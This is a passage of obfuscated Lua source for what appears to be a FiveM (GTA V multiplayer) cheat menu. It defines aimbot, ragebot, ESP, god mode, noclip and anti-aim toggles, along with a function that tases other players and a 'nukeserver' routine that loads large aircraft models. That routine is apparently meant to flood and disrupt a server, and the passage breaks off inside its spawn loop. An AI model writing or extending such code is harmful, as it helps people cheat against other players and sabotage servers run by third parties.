    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}


--------MENU---------

local function DoNetwork(obj)
        if not Citizen.InvokeNative(0x7239B21A38F536BA, obj) then return end
        local id_DSGUHISUDGSDG = Citizen.InvokeNative(0x99BFDC94A603E541, obj)
        Citizen.InvokeNative(0x2B1813ABA29016C5, id_DSGUHISUDGSDG, vitolasRPMQCUeMEUCUzz)
        Citizen.InvokeNative(0xE05E81A888FA63C8, id_DSGUHISUDGSDG, vitolasRPMQCUeMEUCUzz)
        Citizen.InvokeNative(0x299EEB23175895FC, id_DSGUHISUDGSDG, admgordolas)

        for _, src_DSHGIUDSGSDG in pairs(GetActivePlayers()) do
            Citizen.InvokeNative(0xA8A024587329F36A, id_DSGUHISUDGSDG, src_DSHGIUDSGSDG, vitolasRPMQCUeMEUCUzz)
        end
    end



    locals     = {
        -- Menu Locals --
        
        Menu_Display = admgordolas,
        Displayed = admgordolas,
        watermark = vitolasRPMQCUeMEUCUzz,
        Menu_Display = admgordolas,
        MenuEnabled = vitolasRPMQCUeMEUCUzz,
        ShowPressedKeys = vitolasRPMQCUeMEUCUzz;
        selected = "",
        selected2 = "",
        current_tab = "Jogador",
        meupau_color = { r = 0, g = 0, b = 0 },
        
        -- Combat Locals --
        
        AllBones = {
        ["HEAD"] = 31086,
        ["NECK"] = 39317,
        ["R FOOT"] = 52301,
        ["L FOOT"] = 14201,
        ["L FOREARM"] = 61163,
        ["R FOREARM"] = 28252,
        ["L UPPER ARM"] = 45509,
        ["R UPPER ARM"] = 40269
        },
        
        SelectedBones = {
        ["HEAD"] = admgordolas,
        ["NECK"] = admgordolas,
        ["L FOOT"] = admgordolas,
        ["L FOREARM"] = admgordolas,
        ["R FOREARM"] = admgordolas,
        ["L UPPER ARM"] = admgordolas,
        ["R UPPER ARM"] = admgordolas
        },
        
        
        bunnyhop = admgordolas,
        RageBot = admgordolas,
        Celownik1 = admgordolas,
        Celownik2 = admgordolas,
        CrosshairBetter = admgordolas,    
        force3person = admgordolas,
        forceDriveBy = admgordolas,
        InfinityAmmo = admgordolas,
        OneShot = admgordolas,
        draw_aimbot_fov = admgordolas,
        legit_aimbot = admgordolas,
        InfinityAmmo = admgordolas,
        catgun = admgordolas,
        InfiniteCombatRoll = admgordolas,
        
        fov_x = 0.40,
        fov_x2 = 0.60,
        fov_y = 0.40,
        fov_y2 = 0.60,
        
        -- ESP LOCALS --
        
        esp_switch = admgordolas,
        esp_info = admgordolas,
        esp_box = vitolasRPMQCUeMEUCUzz,
        esp_lines = vitolasRPMQCUeMEUCUzz,
        esp_skeleton = admgordolas,
        
        -- SELF MENU LOCALS --
        
        Invisible = admgordolas,
        eGun = admgordolas, 
        Ragdoll = admgordolas,
        GodMode = admgordolas,
        Noclip = admgordolas,
        Noclip2 = admgordolas,
        ePunch = admgordolas,
        fastrun = admgordolas,
        MakeUFlare = admgordolas,
        InfiniteStamina = admgordolas,
        SuperJump = admgordolas,
        NeverWanted = admgordolas,
        tinyplayer = admgordolas,
        
        -- ONLINE MENU LOCALS --
        
        ids = GetActivePlayers(),
        SelectedPlayer = Citizen_InvokeNative(0x4F8644AF03D0E0D6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()),
        
        Spectate = admgordolas,
        
        -- VISUAL LOCALS --
        
        impacts = {},
        cachedNotifications = {},
        trails_table = {},
        
        trials = admgordolas,
        nofog = admgordolas,
        ShowCoords = admgordolas, 
        DisplayRadar = admgordolas,
        shoot_impact = admgordolas,
        PlayerBlips = admgordolas,
        
        -- ANTIAIM LOCALS --
        
        AntiAim = admgordolas,
        crouched = admgordolas,
        anti_aim_ped = vitolasRPMQCUeMEUCUss,
        
        -- SETTINGS LOCALS --
        
        can_walk_with_menu = vitolasRPMQCUeMEUCUzz,
        console = vitolasRPMQCUeMEUCUzz,
        background = admgordolas,
        UseBackgroundImage = vitolasRPMQCUeMEUCUzz,
        discordPresence = vitolasRPMQCUeMEUCUzz,
        rainbow_menu = admgordolas,
        Safemode = vitolasRPMQCUeMEUCUzz,
        -- VEHICLE MENU LOCALS --
        
        VehGod = admgordolas,
        VehBoost = admgordolas,
        vehicles = {},
        scrool_vehicles = 11,
        SelectedVehicle = 0,
        CamInVeh = admgordolas,
        
        -- TESTING --
        
        peds = {},
        
        -- MISC MENU LOCALS --
        
        AntiAntiAfk = admgordolas,
        walking_antiantiafk = admgordolas,
        disable_collisions = admgordolas,
        Safemode = vitolasRPMQCUeMEUCUzz,
        
        -- FREECAM LOCALS --
        
        Freecam = admgordolas,
        frozen_entities = {},
        tryb = 1,
        modes = {
        "Look Around",
        "Shoot",
        "Create Objects"
        },
        object_freecam = vitolasRPMQCUeMEUCUss,
        freecam_object_heading = vitolasRPMQCUeMEUCUss,
        freecam_object_rotation = 0.0,
        freecam_entity_dragging_heading = vitolasRPMQCUeMEUCUss,
        
        -- NOTIFICATIONS/CONSOLE LOCALS --
        
        console_wiadomosci = {},
        notifications = {},
        scrool = 11,
        scrool_console = 15,
        
        -- Troll Locals --
        DildoRain = admgordolas,
        BugPlayer = admgordolas,
        
        -- OTHER LOCALS --
        
        keys = {
            ["ESC"] = 322,
            ["F1"] = 288,
            ["F2"] = 289,
            ["F3"] = 170,
            ["F5"] = 166,
            ["F6"] = 167,
            ["F7"] = 168,
            ["F8"] = 169,
            ["F9"] = 56,
            ["F10"] = 57,
            ["~"] = 243,
            ["1"] = 157,
            ["2"] = 158,
            ["3"] = 160,
            ["4"] = 164,
            ["5"] = 165,
            ["6"] = 159,
            ["7"] = 161,
            ["8"] = 162,
            ["9"] = 163,
            ["-"] = 84,
            ["="] = 83,
            ["BACKSPACE"] = 177,
            ["TAB"] = 37,
            ["Q"] = 44,
            ["W"] = 32,
            ["E"] = 38,
            ["R"] = 45,
            ["T"] = 245,
            ["Y"] = 246,
            ["U"] = 303,
            ["P"] = 199,
            ["["] = 39,
            ["]"] = 40,
            ["ENTER"] = 18,
            ["CAPS"] = 137,
            ["A"] = 34,
            ["S"] = 8,
            ["D"] = 9,
            ["F"] = 23,
            ["G"] = 47,
            ["H"] = 74,
            ["K"] = 311,
            ["L"] = 182,
            ["LEFTSHIFT"] = 21,
            ["Z"] = 20,
            ["X"] = 73,
            ["C"] = 26,
            ["V"] = 0,
            ["B"] = 29,
            ["N"] = 249,
            ["M"] = 244,
            [","] = 82,
            ["."] = 81,
            ["LEFTCTRL"] = 36,
            ["LEFTALT"] = 19,
            ["SPACE"] = 22,
            ["RIGHTCTRL"] = 70,
            ["HOME"] = 213,
            ["PAGEUP"] = 10,
            ["PAGEDOWN"] = 11,
            ["DELETE"] = 178,
            ["INSERT"] = 121,
            ["LEFT"] = 174,
            ["RIGHT"] = 175,
            ["UP"] = 172,
            ["DOWN"] = 173,
            ["NENTER"] = 201,
            ["MWHEELUP"] = 15,
            ["MWHEELDOWN"] = 14,
            ["LEFTSHIFT/N8"] = 61,
            ["N4"] = 108,
            ["N5"] = 60,
            ["N6"] = 107,
            ["N+"] = 96,
            ["N-"] = 97,
            ["N7"] = 117,
            ["N9"] = 118,
            ["MOUSE1"] = 24,
            ["MOUSE2"] = 25,
            ["MOUSE3"] = 348
        },
        
        AllGuns = {
            "PISTOL",
            "PISTOL_MK2",
            "COMBATPISTOL",
            "APPISTOL",
            "REVOLVER",
            "REVOLVER_MK2",
            "DOUBLEACTION",
            "PISTOL50",
            "SNSPISTOL",
            "SNSPISTOL_MK2",
            "HEAVYPISTOL",
            "VINTAGEPISTOL",
            "STUNGUN",
            "FLAREGUN",
            "MARKSMANPISTOL",
            "KNIFE",
            "KNUCKLE",
            "NIGHTSTICK",
            "HAMMER",
            "BAT",
            "GOLFCLUB",
            "CROWBAR",
            "BOTTLE",
            "DAGGER",
            "HATCHET",
            "MACHETE",
            "FLASHLIGHT",
            "SWITCHBLADE",
            "POOLCUE",
            "PIPEWRENCH",
            "MICROSMG",
            "MINISMG",
            "SMG",
            "SMG_MK2",
            "ASSAULTSMG",
            "COMBATPDW",
            "GUSENBERG",
            "MACHINEPISTOL",
            "MG",
            "COMBATMG",
            "COMBATMG_MK2",
            "ASSAULTRIFLE",
            "ASSAULTRIFLE_MK2",
            "CARBINERIFLE",
            "CARBINERIFLE_MK2",
            "ADVANCEDRIFLE",
            "SPECIALCARBINE",
            "SPECIALCARBINE_MK2",
            "BULLPUPRIFLE",
            "BULLPUPRIFLE_MK2",
            "COMPACTRIFLE",
            "PUMPSHOTGUN",
            "PUMPSHOTGUN_MK2",
            "SWEEPERSHOTGUN",
            "SAWNOFFSHOTGUN",
            "BULLPUPSHOTGUN",
            "ASSAULTSHOTGUN",
            "MUSKET",
            "HEAVYSHOTGUN",
            "DBSHOTGUN",
            "SNIPERRIFLE",
            "HEAVYSNIPER",
            "HEAVYSNIPER_MK2",
            "MARKSMANRIFLE",
            "MARKSMANRIFLE_MK2",
            "GRENADELAUNCHER",
            "GRENADELAUNCHER_SMOKE",
            "RPG",
            "MINIGUN",
            "FIREWORK",
            "RAILGUN",
            "HOMINGLAUNCHER",
            "COMPACTLAUNCHER",
            "GRENADE",
            "STICKYBOMB",
            "PROXMINE",
            "BZGAS",
            "SMOKEGRENADE",
            "MOLOTOV",
            "FIREEXTINGUISHER",
            "PETROLCAN",
            "SNOWBALL",
            "FLARE",
            "BALL"},
    }



local function TazePlayer(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



    ShootSingleBulletBetweenCoords(origin, destination, 1, vitolasRPMQCUeMEUCUzz, 'WEAPON_STUNGUN', PlayerPedId(), vitolasRPMQCUeMEUCUzz, admgordolas, 1.0)
end

if ForceMap then
    DisplayRadar(vitolasRPMQCUeMEUCUzz)
end

if aimlock then
    RequestStreamedTextureDict('mpmissmarkers256', 1)
    DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, visuals_aimlock.value + 0.0,visuals_aimlock.value + 0.0 * 1.8 ,0.0,0,0,0,80)
end

local function ShootAimbot(k)
    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), admgordolas) and 
        IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
        end
    end
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 2) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 3) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 4) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 6) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 8) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 9) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 10) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 11) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 12) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 13) - 1,
        admgordolas
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 14, 16, admgordolas)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 15) - 2,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 16) - 1,
        admgordolas
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 17, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 18, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 19, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 20, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 21, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 22, vitolasRPMQCUeMEUCUzz)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 23, 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 24, 1, admgordolas)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 25) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 27) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 28) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 30) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 33) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 34) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 35) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 38) - 1,
        vitolasRPMQCUeMEUCUzz
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5)
end
function engine(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 11) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 12) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 13) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 15) - 2,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 16) - 1,
        admgordolas
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 17, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 18, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 19, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 21, vitolasRPMQCUeMEUCUzz)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
end
function engine1(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 2) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 3) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 4) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 6) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 8) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 9) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 10) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 11) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 12) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 13) - 1,
        admgordolas
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 14, 16, admgordolas)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 15) - 2,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 16) - 1,
        admgordolas
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 17, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 18, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 19, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 20, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 21, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 22, vitolasRPMQCUeMEUCUzz)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 23, 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 24, 1, admgordolas)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 25) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 27) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 28) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 30) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 33) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 34) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 35) - 1,
        admgordolas
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 38) - 1,
        vitolasRPMQCUeMEUCUzz
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5)
end



local function RotationToDirection(rotation)
    local retz = admmeupau.rad(rotation.z)
    local retx = admmeupau.rad(rotation.x)
    local absx = admmeupau.abs(admmeupau.cos(retx))
    return vector3(-admmeupau.sin(retz) * absx, admmeupau.cos(retz) * absx, admmeupau.sin(retx))
end

function text(nazwa,outline,size,Justification,xx,yy, centre, font)

    if outline then
        SetTextOutline()
    end
    if font ~= vitolasRPMQCUeMEUCUss and tonumber(font) ~= vitolasRPMQCUeMEUCUss then
    SetTextFont(font)
    else
    SetTextFont(0)
    end
    if centre then
        SetTextCentre(vitolasRPMQCUeMEUCUzz)
    end
    
    SetTextProportional(1)
    SetTextScale(100.0, size)
    SetTextEdge(1, 0, 0,227,255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa)
    EndTextCommandDisplayText(xx, yy)
end


function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(dh))do 
            vitolasRPMQCUeMEUCUtt(0)
            RequestModel(vitolasRPMQCUeMEUCUff(dh))
        end
        
        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(di))do
            vitolasRPMQCUeMEUCUtt(0)RequestModel(vitolasRPMQCUeMEUCUff(di))
        end
            
        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(dg))do 
            vitolasRPMQCUeMEUCUtt(0)RequestModel(vitolasRPMQCUeMEUCUff(dg))
        end
            
        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(dj))do 
            vitolasRPMQCUeMEUCUtt(0)RequestModel(vitolasRPMQCUeMEUCUff(dj))
        end
        
        while not HasModelLoaded(vitolasRPMQCUeMEUCUff(dk))do 
            vitolasRPMQCUeMEUCUtt(0)RequestModel(vitolasRPMQCUeMEUCUff(dk))
        end
        

        
        for i=0,128 do 
